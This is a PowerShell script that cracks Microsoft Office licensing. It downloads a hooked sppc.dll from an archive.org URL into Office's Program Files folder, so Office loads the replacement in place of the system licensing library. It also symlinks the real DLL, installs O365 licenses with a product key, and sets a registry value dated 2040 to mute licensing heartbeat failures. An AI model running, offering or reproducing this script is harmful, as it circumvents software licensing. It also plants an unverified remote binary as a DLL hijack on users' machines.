Add-Type -AssemblyName System.Windows.Forms
if (-not (test-path "$env:ProgramFiles\Microsoft Office\root\vfs\System")){ 
    [System.Windows.Forms.MessageBox]::Show("Office (64-bit) not found! Go to Download tab, download and install it there.","MalwActivator",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
    exit
}
cmd /c mklink "$env:ProgramFiles\Microsoft Office\root\vfs\System\sppcs.dll" "$env:SystemRoot\System32\sppc.dll"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object net.webclient
$wc.DownloadFile('https://archive.org/download/asdcorpohook/sppc.dll', "$env:ProgramFiles\Microsoft Office\root\vfs\System\sppc.dll")
cd "$env:ProgramFiles\Microsoft Office\Office16"
Get-ChildItem -Path "..\root\Licenses16\" -Filter "O365ProPlusR*.xrm-ms" | ForEach-Object { cscript ospp.vbs /inslic:"$($_.FullName)" }
cscript //nologo ospp.vbs /inpkey:2N382-D6PKK-QTX4D-2JJYK-M96P2
reg add HKCU\Software\Microsoft\Office\16.0\Common\Licensing\Resiliency /v "TimeOfLastHeartbeatFailure" /t REG_SZ /d "2040-01-01T00:00:00Z" /f
pause